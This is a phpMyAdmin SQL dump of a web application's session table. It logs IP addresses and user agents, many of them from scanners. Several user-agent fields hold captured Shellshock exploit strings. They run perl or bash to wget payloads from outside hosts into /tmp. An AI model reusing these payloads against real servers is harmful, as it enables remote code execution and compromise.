-- phpMyAdmin SQL Dump
-- version 4.0.10deb1
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Feb 03, 2015 at 11:02 PM
-- Server version: 5.5.40-0ubuntu0.14.04.1
-- PHP Version: 5.5.9-1ubuntu4.4

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `cunami`
--

-- --------------------------------------------------------

--
-- Table structure for table `ci_sessions`
--

CREATE TABLE IF NOT EXISTS `ci_sessions` (
  `session_id` varchar(40) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `ip_address` varchar(45) COLLATE utf8_unicode_ci NOT NULL DEFAULT '0',
  `user_agent` varchar(120) COLLATE utf8_unicode_ci NOT NULL,
  `last_activity` int(10) unsigned NOT NULL DEFAULT '0',
  `user_data` text COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`session_id`),
  KEY `last_activity_idx` (`last_activity`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `ci_sessions`
--

INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('004c87e73aba55ed1c8163d08f97d6e6', '185.35.62.11', '0', 1422983744, ''),
('006dce3dcdcec83d331df3b01123666f', '185.35.62.11', '0', 1422383103, ''),
('00b2474099b5dc6a9cfa881af75dd79e', '168.83.7.124', '0', 1419137255, ''),
('01a43a0cbbc67953afca6a968b44c39e', '210.83.204.186', '0', 1418246165, ''),
('01a9eb1a6587d82c932c2cee0ed17d19', '182.118.55.155', 'Go 1.1 package http', 1419442363, ''),
('02f1dd068dce2869ec40d4e124519674', '192.184.42.205', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1418067582, ''),
('03d4adfcd2518b2b562e19c8dd945fe1', '222.186.31.160', 'Mozilla/5.0', 1422477890, ''),
('04bda5e00bc6aa2fed5aa379e1242068', '82.192.93.224', '0', 1420974060, ''),
('05563a9aed32ed3e229bf6acd01b25f8', '125.160.11.66', 'Morfeus Fucking Scanner', 1420370165, ''),
('089ec7a545227cc41cca1f8bdc2976f2', '188.138.17.205', '0', 1422880094, ''),
('0a694ce644c97b32113891a10967728b', '211.144.85.220', 'Mozilla/5.0', 1417765301, ''),
('0ed209b8d82431de7c2dbbe7c0aa5670', '180.153.195.88', '0', 1417884643, ''),
('0f946b72a8deb7d0fbfc57df49f369c9', '188.138.17.205', '0', 1422417771, ''),
('0fd6a95808ec1a4bb90b6abd87c19266', '200.182.20.194', '0', 1417922869, ''),
('0ff65f2572616d164dd39cde42bda271', '182.118.53.207', 'Go 1.1 package http', 1421619410, ''),
('123e06f7edd568dfcd9d047fe7e43b8c', '104.167.107.175', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1420023405, ''),
('131b837376e00d4b6224abaa95f25800', '182.254.220.59', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 1422933929, ''),
('1343e6f7b1323bb9ea5d04ae5e93d43a', '185.28.193.98', '0', 1418937956, ''),
('136f227c3190b02b6daa4b05e561f551', '222.186.52.91', 'Mozilla/5.0', 1421095869, ''),
('13a33ede83f251d67650ba88bacbb78c', '123.151.149.222', '0', 1417289458, ''),
('13e399f4c2fd54de89666bb67b9cfaf0', '62.210.136.203', '0', 1417418974, ''),
('14ebc1ce06a846197ba536a157572384', '98.126.3.75', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422180667, ''),
('16a7778a1d5c2890a60d7a7a415ec778', '182.118.54.75', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420010639, ''),
('17a56883b0c9967d9277d3271dc1eb7f', '98.126.9.243', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422193463, ''),
('17ae7b854cdbddcabab3da423d22e11d', '61.240.144.67', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1420115777, ''),
('180531d153cb05db7ab187ce6981ad9d', '222.186.52.91', 'Mozilla/5.0', 1421294543, ''),
('1914ae635fb2479ee7cf49b5f48aaa8e', '54.72.105.255', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)', 1418224927, ''),
('1984660aca55bd3c12e124c254c9ed63', '91.236.75.92', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36', 1421481298, ''),
('1af5c41135ec9435537c1e91c8ebd575', '23.253.163.53', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.40) Gecko/20101468 Firefox/3.6.13', 1422727200, ''),
('1b44c5190e5c20f72d47331232e0c9ea', '65.207.23.201', 'Morfeus Fucking Scanner', 1418975456, ''),
('1bd229349188d8027a18d2fbd3d64885', '::1', 'Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobi', 1415436974, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('1d2b9ef75e0c25004fb1f12049fde01e', '182.118.53.132', 'Go 1.1 package http', 1421451433, ''),
('1dddbb89397bca4978b2fa9e647fef89', '182.118.53.123', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420753356, ''),
('1de762d463c355ead0dd39b6c483af7a', '182.254.220.59', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 1422933931, ''),
('20cba3b005daaf1fdd9e2bab87984ec6', '222.186.31.160', 'Mozilla/5.0', 1422953449, ''),
('20db5239a80afa8de1439af2cba64d64', '182.118.53.132', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421277785, ''),
('212fc27502a37f5255d58c8ea83cdbf7', '54.83.197.200', '0', 1418393072, ''),
('21d7df0778f21582c1ea082d7a1b619b', '182.118.53.123', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420930117, ''),
('2242e4331e114af8e2ebd35526c16afd', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415438867, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('22b21d98c87ed318e3942baa6f0cc153', '98.126.9.245', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422297432, ''),
('23962e96dee67970ca18cbd104e6991a', '222.186.31.160', 'Mozilla/5.0', 1422155570, ''),
('241d709722f4cd1beaf54bc4128dad5c', '222.186.31.160', 'Mozilla/5.0', 1421161625, ''),
('244358fa5f53b4584dced021be2fbad0', '185.35.62.11', '0', 1422004992, ''),
('25373e114e3643ca2074f26a9eeba65d', '185.35.62.11', '0', 1422119817, ''),
('282c2c7055525a2b19d2e19c3e0280d2', '174.139.31.146', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422700657, ''),
('28bd1ab8f909b44262e17af8c5f89753', '182.118.53.133', 'Go 1.1 package http', 1422637145, ''),
('2a05ef9a7edd88170415563c77d2a43b', '88.255.215.100', '0', 1418433898, ''),
('2c9ffde7b1871589b7e7db13fe5e7cf5', '182.118.53.207', 'Go 1.1 package http', 1422917513, ''),
('2e13cd3f7084ba19b2e80396d8b8b252', '222.186.31.160', 'Mozilla/5.0', 1422953449, ''),
('2fcc684199ed7a3662aa89c0212216cb', '171.13.14.29', '0', 1417752622, ''),
('302a5cfa6e9583d54af1c2c6f4e503f0', '89.163.196.198', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1422247209, ''),
('323abc41c43ed4fc07513193846906a8', '169.229.3.93', '0', 1422277753, ''),
('3266709193b0d6d15c740691ef7c96f2', '188.138.17.205', '0', 1422243560, ''),
('32c6b29c9b1fc0724c73f0133066d41a', '128.208.4.164', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1421378381, ''),
('334cec7818df9288c4becb03e6e3cde8', '54.218.77.81', '0', 1419387037, ''),
('33808a360e0c54dbc50ad568fb5191a9', '212.38.181.144', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1420299683, ''),
('33a7240c2e9efec5ab2b8766754bf445', '171.13.14.21', '0', 1417752420, ''),
('34bd5cf2d9780ec6e1bf9f9abdb90fe1', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415435116, 'a:4:{s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('3664cef9720ac406778ca77de494f6d6', '112.133.230.54', '0', 1419686779, ''),
('374566fbda9c258b201acabf1fd3769f', '54.224.123.94', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1417779448, ''),
('37ab24980a2b27186f2c77f2cee9eb12', '71.6.167.142', '0', 1417164880, ''),
('37d015acac116af56438078aee21cfed', '76.164.225.90', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.7.98) Gecko/20101180 Firefox/3.5.92', 1417466175, ''),
('37ed31c848081ace401abc0570d6f917', '188.138.17.205', '0', 1422417792, ''),
('395d3fcf12b74bb34a5521034f889bd0', '54.162.103.133', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1419002049, ''),
('3a58110da659f66c5a7f4dc84cc05482', '109.245.1.238', 'Mozilla/5.0 (Linux; Android 4.1.2; GT-S6310 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mob', 1422208782, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('3c8c2299b7f40e6d9deb70df47722f4e', '198.20.69.74', '0', 1418792360, ''),
('3fcfb3f3855b1e1e763caece5fc4bf2c', '118.192.48.33', '0', 1418322189, ''),
('40fae7b9eca62998d14ce7b5822ef9b1', '54.81.105.101', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1420463062, ''),
('413aa6dad762d4d1dd81e6becad5b5ad', '182.118.53.90', 'Go 1.1 package http', 1421277797, ''),
('4220e06bbeca5e6ca4e380f66dda3d33', '216.20.131.111', 'Morfeus Fucking Scanner', 1418809016, ''),
('42ff1afd93e5eb67f58a91aa1612d139', '222.186.31.160', 'Mozilla/5.0', 1422679791, ''),
('430ee9faa54fc187f7f49f423bc65594', '104.148.71.158', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422049421, ''),
('440dcfb8f8956bd4241b53c67499812d', '203.148.48.88', '0', 1421825638, ''),
('4535114fd2ea746685f39fb133098e40', '::1', 'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.', 1415453763, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('456855719ba3155f36efd0e382c95e5a', '188.138.17.205', '0', 1422158762, ''),
('4718235c46ed7a9dfe8a2ca60d853191', '222.186.31.160', 'Mozilla/5.0', 1422778596, ''),
('47d95f62e9abef5ebb88c5ca2e8596cf', '62.117.80.169', '0', 1420815767, ''),
('47e0f4f8c37efee00db99f28c469fb88', '88.255.215.100', '0', 1418443724, ''),
('4812feba5923149bc7255972e164c845', '54.254.240.89', 'Mozilla/5.0', 1417868828, ''),
('4a221a298d185918bcef25c697ff4fce', '98.126.9.243', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422193463, ''),
('4e6447f9a8b2b46e19141fa32160c4e1', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36', 1415465720, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"2";}'),
('4eb4affc6af73a29b8b8d3589bc469e9', '222.186.31.160', 'Mozilla/5.0', 1422259625, ''),
('50c58698d8b35eb21cea8e8282acbc87', '182.254.138.21', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0', 1422478016, ''),
('51d0196bb8067b2c6fa0e202b24aa3a6', '71.6.167.142', '0', 1420704446, ''),
('5281b9c777e20796f76f9c6a167fddaf', '104.148.71.158', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422049422, ''),
('53361a8863468fbbaced4db6226bd808', '182.118.53.145', 'Go 1.1 package http', 1418408177, ''),
('5441dc738dc38f077d08901026248efe', '222.186.31.160', 'Mozilla/5.0', 1422482764, ''),
('54c0476f927751818a442c566363e36b', '185.35.62.11', '0', 1422291457, ''),
('5510a5adc54951aacf0576058855c883', '200.21.104.8', '0', 1418390544, ''),
('55c4f3b7171b3f4995f36e1d326cba46', '222.186.31.160', 'Mozilla/5.0', 1422863608, ''),
('563955101584c1caa99443d4d2b34902', '::1', 'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.', 1415451666, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('56fa0ba6906efd0754e47c355a6d84c4', '178.211.33.154', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0', 1421475576, ''),
('571d9afe39045ff3468794daf3a7b243', '62.210.38.226', '0', 1418889645, ''),
('575c6d1293fa0fc15570243056a22df9', '222.186.31.160', 'Mozilla/5.0', 1422863608, ''),
('58f42812e170abc1564ad87657218d33', '201.150.36.119', '0', 1418374335, ''),
('5a25264b176629e311d70d02b8c1f3bb', '222.186.31.160', 'Mozilla/5.0', 1421202823, ''),
('5a6640189b8a84c4c2bf21053deab637', '192.163.250.213', '0', 1419291150, ''),
('5b0ece3e5e05b5042419f8f6559303a4', '182.118.53.207', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421619408, ''),
('5cb5ace7d20476604f73674787766a60', '173.164.244.83', 'Morfeus Fucking Scanner', 1419218498, ''),
('5cc1691f2b2c829c8eb6e44cf78c38cf', '54.93.172.167', '0', 1417556877, ''),
('5f268cf14e0a746148146e8faa85cbfa', '222.186.31.160', 'Mozilla/5.0', 1421202824, ''),
('61a5e6645ec2313aa27ebf246395463a', '182.118.53.30', 'Go 1.1 package http', 1422142984, ''),
('61b74589c1ba34cde49c12b395ef32b9', '193.203.61.35', '0', 1420890213, ''),
('61c1a346a68b82f56f8a1ee1c142895b', '85.25.48.150', '() { :;};/usr/bin/perl -e ''print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!";system("wget http://allproutah.com/t3.log -', 1422437772, ''),
('624afd2e60656ac57e6f5fafb2dc482d', '198.20.69.74', '0', 1419029711, ''),
('6272f62ded29e66aa4447dbb5b04bec9', '123.151.149.222', '0', 1421256669, ''),
('64a2a4144c8d9106efdde258924f78ac', '222.186.31.160', 'Mozilla/5.0', 1421286867, ''),
('64ff5099583e6e784e2e5c38b925c0bf', '::1', 'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.', 1415436397, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('6504bbb058f215cf955e90e430777987', '222.186.31.160', 'Mozilla/5.0', 1422522334, ''),
('65ebb932e6d0767ea4a45928477e8e25', '222.186.31.160', 'Mozilla/5.0', 1422482763, ''),
('66011db994153694c767caec3e589025', '182.118.54.62', 'Go 1.1 package http', 1422313780, ''),
('672a032b7b37fd64a7029b36261cbf89', '123.151.149.222', '0', 1419272768, ''),
('675fcb6673ea8e8d1845b07e389034c7', '94.189.242.92', 'Mozilla/5.0 (Linux; Android 4.4.2; ZTE Blade L2 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.14', 1422703232, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('679c4b4195686c2b03d9ee6b5aa90b34', '108.163.223.226', '() { :;};/usr/bin/perl -e ''print "Content-Type: text/plain\\r\\n\\r\\nXSUCCESSX";system("wget http://74.208.166.12/bot.txt -', 1422377434, ''),
('67ea82d8ca3ca1eb361c65a27e5e51ae', '164.40.153.130', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0', 1417955062, ''),
('67fa055e7ef64f774cda66f615616944', '178.211.33.154', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0', 1421150124, ''),
('696b6551ad17f2415cbcd046beec5c80', '222.186.52.91', 'Mozilla/5.0', 1421143320, ''),
('6a11857f350d8173768878b862ac64e8', '62.210.38.226', '0', 1418172922, ''),
('6ba1c772d124492f1a752f21c7b11694', '198.101.242.72', 'Opera/9.15 (Windows NT 5.1; U; en) Presto/2.6.60 Version/10.88', 1420618877, ''),
('6e471b2117164a0a10146c5e7076b243', '174.139.31.146', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422700654, ''),
('7089e88709ccf4ea8d11276372e524ce', '182.118.55.239', 'Go 1.1 package http', 1420581781, ''),
('7151c06f2a69bd5e81baca8982aafb72', '222.186.31.160', 'Mozilla/5.0', 1421161625, ''),
('72be43f3425c01fb455e7e39d1b74e39', '222.186.52.91', 'Mozilla/5.0', 1421146525, ''),
('72c3d51c749bb309cbb43030647c3f9d', '194.63.140.62', 'Python-urllib/2.7', 1420569532, ''),
('734a78c8ae717df932cde2b8da1b9c06', '61.164.126.5', '() { :; }; /bin/bash -c "rm -rf /tmp/*;echo wget http://121.12.173.173:81/9521 -O /tmp/China.Z-klcn >> /tmp/Run.sh;echo', 1421130113, ''),
('73eb5b12fa6d9a39489cae5ae35c625b', '193.107.17.70', 'Python-urllib/2.6', 1422710328, ''),
('7652c824373dbb6b9d186af90f713c84', '54.154.67.27', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)', 1420638928, ''),
('772c1c8f15edee8e5f54e07d54b780e1', '182.118.53.90', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421277797, ''),
('7824b261556bc88f4ea51db7414a4b79', '185.35.62.11', '0', 1422470952, ''),
('78559ca43dcc658f77f578ed712c5837', '62.210.136.203', '0', 1419939048, ''),
('78c0b9023719f7d4ab273da72bc3e61e', '222.186.52.91', 'Mozilla/5.0', 1421146525, ''),
('7b0011c297311f59e9c1276c431e4555', '182.118.53.123', 'Go 1.1 package http', 1420753357, ''),
('7b1e47277fb4dbd3909d468a58f350c8', '222.186.52.91', 'Mozilla/5.0', 1421358060, ''),
('7b331a4308888d600933c108badf4abd', '198.20.69.98', '0', 1419320089, ''),
('7c10db6b048e376a55d2f5bf75add9e1', '182.118.60.61', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420018118, ''),
('7c88c34e82298768b64089d9c91a2dc7', '182.118.53.207', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422917512, ''),
('7d1e0ac4dc55afdcc8c1f50ea8fa98e5', '222.186.52.91', 'Mozilla/5.0', 1421213524, ''),
('7d7872ce22a90cb6b80a85c2ccc68a65', '104.148.71.164', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422719626, ''),
('7d7b2ed91e8ba877080af5a732f220a9', '188.138.17.205', '0', 1422417757, ''),
('7edf805afca57b05b6b637b4a1446f0e', '182.118.53.132', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421451432, ''),
('8006152d5b9ef3a542c9590d10f91863', '82.117.208.243', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1417277897, ''),
('80116f2f921f08000041c5e7dd3c1854', '180.153.196.125', '0', 1420257976, ''),
('80376f5e8fb9ad621f890fff084875b4', '65.207.23.201', 'Morfeus Fucking Scanner', 1417760751, ''),
('85ec6fb84d23c523a65b6d173b1070bf', '182.118.55.239', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420581781, ''),
('8713303e8ec8437d8a2ed4a3b59dc769', '88.255.215.100', '0', 1418429005, ''),
('8a650622773fec68bf700311a9940e6f', '169.229.3.91', '0', 1422468029, ''),
('8acb0f410e34630a508567ce13395134', '193.107.17.70', 'Python-urllib/2.6', 1422710328, ''),
('8b0a29612598c5fd47aa48e076b085e3', '209.126.230.71', 'Robocop', 1418381828, ''),
('8b1742321d2b36dedfefe8e073b8f381', '::1', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36', 1417076656, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('8ba2342e37812b874ee4328d2650f3f5', '185.35.62.11', '0', 1422209130, ''),
('8bb603236a745c5944b9bbbf66a14879', '222.186.31.160', 'Mozilla/5.0', 1422633346, ''),
('8d8f6142e3c828c65b5ab2873633b610', '192.184.42.205', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1418067583, ''),
('8ee07c9d8b17169fbcc85934cd76cc53', '188.138.1.229', '0', 1422140531, ''),
('8f0f5ddc57f22310449ad5b8e44d6521', '222.186.52.91', 'Mozilla/5.0', 1421143321, ''),
('8f2d071e692f10743d95397e0c03e1f9', '178.211.33.154', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0', 1421791330, ''),
('907eebe73de350a007158056483f0330', '222.186.52.91', 'Mozilla/5.0', 1421469722, ''),
('90920a970604e941732b0bc3110cb7f0', '193.174.89.19', 'Mozilla/5.0 (compatible; Muenster University of Applied Sciences; +http://fb02itsscan.fh-muenster.de)', 1418722875, ''),
('9222a99d2a4f5483d6c450222854ddef', '71.172.250.43', '0', 1418569071, ''),
('936d5c500f69422525b874e7374e1e70', '182.118.53.145', 'Go 1.1 package http', 1418408178, ''),
('95ba0944d9deef6bf0f761b051622d61', '182.118.53.123', 'Go 1.1 package http', 1420930118, ''),
('964e4f449f213a7350964ef388f8b0e6', '54.183.131.10', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)', 1419423983, ''),
('9751ead6e5dcd312aa6f04b08c988aae', '104.148.71.164', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422719626, ''),
('97dc7f70d633e81fb41ad8d229bdad75', '222.186.31.160', 'Mozilla/5.0', 1422477891, ''),
('9854c7be01216b963f5f882cab74b8a1', '222.186.31.160', 'Mozilla/5.0', 1421286867, ''),
('9ab4272ee2dcb7b6edc8bcfd9463426e', '222.186.52.91', 'Mozilla/5.0', 1421213524, ''),
('9d1e051184d5bdd97428d7aded9bc007', '222.186.31.160', 'Mozilla/5.0', 1422409296, ''),
('9e726dbef846b7f8d519cd61f2cede1f', '193.107.17.70', 'Python-urllib/2.6', 1422713880, ''),
('9f9dc5c3a786d487d714c1f7a6b2cc41', '54.89.82.24', 'Cloud mapping experiment. Contact research@pdrlabs.net', 1419792667, ''),
('a0a068688c8e7652c1686c47ea487bb9', '188.138.17.205', '0', 1422654074, ''),
('a13450649bbfd29d1ac95b47b1a0d73f', '188.138.17.205', '0', 1422638837, ''),
('a35e26072ad54a8061a68d8102918e78', '61.240.144.66', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', 1419941513, ''),
('a3701be06e853359f40b69822ecd71e5', '118.98.104.21', 'Morfeus Fucking Scanner', 1422792683, ''),
('a538772accd13cda812bdaf743b296a2', '88.255.215.100', '0', 1418423921, ''),
('a585e1ed4097cb159f58fad49a536609', '200.131.68.171', '0', 1418510996, ''),
('a5b69aeb6e02e9df107f1c1d59c996b5', '62.75.216.19', 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0', 1420113000, ''),
('a6d6fa6029610afa98814d89016ae57a', '98.126.9.245', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36', 1422297435, ''),
('a722f53469ca97a030b8a80abbce673a', '182.118.55.137', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1421967100, ''),
('a74b6706ef6eb51739a3e25f4ab743ad', '98.143.148.107', 'Mozilla/5.0 MetaIntelligence', 1418052675, ''),
('a77bbd5edea2c29c0f33124242ebd67b', '::1', 'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.', 1415438853, 'a:5:{s:9:"user_data";s:0:"";s:8:"username";s:6:"damjan";s:5:"email";s:11:"no@mail.yet";s:9:"logged_in";b:1;s:15:"studio_location";s:1:"1";}'),
('a8126d7bdb9dbbdbbe17360519a97513', '31.192.105.59', '0', 1422196556, ''),
('a837c7cf70458a4f7308ff24a0b12793', '193.107.17.70', 'Python-urllib/2.6', 1422713880, ''),
('a98e51e7fbacf589a3255ca460fecf2c', '171.13.14.8', '0', 1417766269, ''),
('aa47c4f5b7121857eb97c9a0e7a6ee75', '182.118.53.123', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1420408857, ''),
('ac51aa0cb53a9856da3b925c2f12faf0', '182.118.53.133', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422637140, ''),
('ad5147fb8530a3a18710c7172309ceda', '222.186.31.160', 'Mozilla/5.0', 1421921257, ''),
('aeee52211fbd8a2dc63c3fc50370c6cd', '182.118.54.62', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36', 1422313780, ''),
('aef47566673ade72e18802ab545532e4', '194.63.140.62', 'Python-urllib/2.7', 1420569531, ''),
('b19716631384a27ba1783cc693894c28', '182.118.53.132', 'Go 1.1 package http', 1421277785, ''),
('b22c7159dab177b471e535f333c7210f', '222.186.31.160', 'Mozilla/5.0', 1421921257, ''),
